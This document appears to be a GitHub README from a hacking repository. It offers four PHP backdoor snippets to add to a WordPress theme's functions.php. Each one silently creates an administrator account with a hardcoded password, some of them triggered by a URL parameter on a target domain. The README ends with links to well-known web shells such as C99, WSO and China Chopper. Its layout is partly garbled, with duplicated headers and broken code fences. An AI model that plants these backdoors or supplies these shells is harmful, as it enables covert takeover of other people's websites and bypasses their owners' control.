![Logo](https://github.com/cyber-insect99/photo-gallery-/blob/main/link-in-bio-backdoor-and-web.png?raw=true)

## Backdoor-01 (add to theme functions.php)






```bash

function wpb_admin_account(){
$user = ‘minhaz’;
$pass = ‘pass’;
$email = ’email@email.em’;
if ( !username_exists( $user ) && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( ‘administrator’ );
}
}
add_action(‘init’,’wpb_admin_account’);
```
![Logo](https://github.com/cyber-insect99/photo-gallery-/blob/main/Screenshot_1.png?raw=true)
## Backdoor-02 (add to theme functions.php)






```bash

<?php
add_action(‘wp_head’, ‘WordPress_backdoor’);
function WordPress_backdoor() {
If ($_GET[‘backdoor’] == ‘go’) {
require(‘wp-includes/registration.php’);
If (!username_exists(‘backdooradmin’)) {
$user_id = wp_create_user(‘backdooradmin’, ‘Pa55W0rd’);
$user = new WP_User($user_id);
$user->set_role(‘administrator’);
}
}
}
?>

```
https://www.targetdomain.com?backdoor=go
- User: backdooradmin
 - Password: Pa55W0rd




## Backdoor-03 (add to theme functions.php)






```bash

add_action( 'wp_head', 'my_backdoor' );

function my_backdoor() {
    if ( md5( $_GET['backdoor'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'cyber_insect99' ) ) {
            $user_id = wp_create_user( 'cyber_insect99', 'pass' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' ); 
        }
    }
}


```
https://www.targetdomain.com?backdoor=go
- User: cyber_insect99
 - Password: pass

## Backdoor-04 (add to theme functions.php)






```bash

add_action( 'wp_head', 'my_backdoor' );
## Backdoor-03 (add to theme functions.php)






```bash

## Backdoor-03 (add to theme functions.php)






```bash

$new_user = new Wp_User(wp_create_user('user','password'));
$new_user->set_role('administrator');




```
- Then go to use option on wordpress deshboard the you will see  a new user .
- User: user
 - Password: password


# Web Shell
# 
![Logo](https://github.com/jco666/alfa-shell/raw/master/readme_1.png)
 - [Alpha Web Shell ](https://github.com/nicolauns/alfa-shell )
 - [ASPXSpy Web Shell:](https://github.com/tennc/webshell/blob/master/net-friend/aspx/aspxspy.aspx)
 - [C99 Backdoor Web Shell](https://github.com/tennc/webshell/tree/master/php/PHPshell/c99shell)
 - [China Chopper Shell](https://github.com/tennc/webshell/tree/master/caidao-shell)
 - [ IndoXploit Shell (IDX Shell) ](https://github.com/linuxsec/indoxploit-shell)
 - [WSO Web Shell](https://github.com/tennc/webshell/tree/master/php/wso)
  - [B374k PHP Shell](https://github.com/b374k/b374k)
   - [r57 Shell](https://github.com/tennc/webshell/tree/master/138shell/R)
